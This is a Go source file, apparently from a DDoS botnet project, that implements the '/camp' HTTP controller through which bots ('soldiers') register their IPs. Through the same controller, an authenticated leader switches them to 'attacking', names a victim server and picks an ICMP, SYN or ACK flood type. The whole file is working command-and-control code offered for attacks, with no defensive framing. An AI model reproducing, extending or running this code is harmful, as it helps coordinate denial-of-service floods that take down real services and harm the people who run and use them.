package dispatcher

import (
	"encoding/json"
	"net"
	"net/http"
)

func HandleCamp(writer http.ResponseWriter, request *http.Request, d *Dispatcher) {
	if request.Method == "GET" {
		err := json.NewEncoder(writer).Encode(d.Cmp)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
	}
	if request.Method == "POST" {
		//add soldier to camp
		var soldier Soldier

		err := json.NewDecoder(request.Body).Decode(&soldier)
		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}

		if d.Cmp.SoldierExists(soldier.Name) {
			http.Error(writer, "Soldier already exists", http.StatusBadRequest)
			return
		}

		// request.RemoteAddr == "" that means its testing, let change it
		if request.RemoteAddr == "" {
			request.RemoteAddr = "127.0.0.1:8081"
		}

		//set soldier ip
		ip, _, err := net.SplitHostPort(request.RemoteAddr)

		if err != nil {
			http.Error(writer, err.Error(), http.StatusBadRequest)
			return
		}
		soldier.Ip = ip
		d.Cmp.AddSoldier(soldier)
		writer.WriteHeader(http.StatusOK)
	}
	if request.Method == "DELETE" {
		auth := request.Header.Get("Authorization")

		if isAuthorized(auth, d.Cmp.Leader.AuthenticationHash) {
			//remove soldier from camp
			var soldier Soldier
			err := json.NewDecoder(request.Body).Decode(&soldier)
			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}

			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}

			if !d.Cmp.SoldierExists(soldier.Name) {
				http.Error(writer, "Soldier does not exist", http.StatusNotFound)
				return
			}

			d.Cmp.RemoveSoldier(soldier.Name)
			writer.WriteHeader(http.StatusOK)

		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}

	// update camp status
	if request.Method == "PUT" {
		if isAuthorized(request.Header.Get("Authorization"), d.Cmp.Leader.AuthenticationHash) {
			var cp CampSettings
			err := json.NewDecoder(request.Body).Decode(&cp)
			if err != nil {
				http.Error(writer, err.Error(), http.StatusBadRequest)
				return
			}
			if cp.Status != StatusAttacking && cp.Status != StatusStopped && cp.Status != "" {
				http.Error(writer, "Invalid status", http.StatusBadRequest)
				return
			}
			if cp.DDOSType != DDOSTypeICMP && cp.DDOSType != DDOSTypeSYN && cp.DDOSType != DDOSTypeACK && cp.DDOSType != "" {
				http.Error(writer, "Invalid ddos type", http.StatusBadRequest)
				return
			}
			if cp.VictimServer != "" {
				ip, port, err := net.SplitHostPort(cp.VictimServer)
				if err != nil || port == "" || net.ParseIP(ip) == nil {
					http.Error(writer, "Invalid victim server", http.StatusBadRequest)
					return
				}
			}
			d.Cmp.UpdateSettings(cp.Status, cp.VictimServer, cp.DDOSType)
			writer.WriteHeader(http.StatusOK)

		} else {
			http.Error(writer, "Unauthorized", http.StatusUnauthorized)
			return
		}
	}
}

func isAuthorized(auth string, hash string) bool {
	if HashOf(auth) == hash {
		return true
	}
	return false
}

func Start(d *Dispatcher) {
	http.HandleFunc("/camp", func(writer http.ResponseWriter, request *http.Request) {
		HandleCamp(writer, request, d)
	})
	_ = http.ListenAndServe(d.ListeningAddress+":"+d.ListeningPort, nil)
}
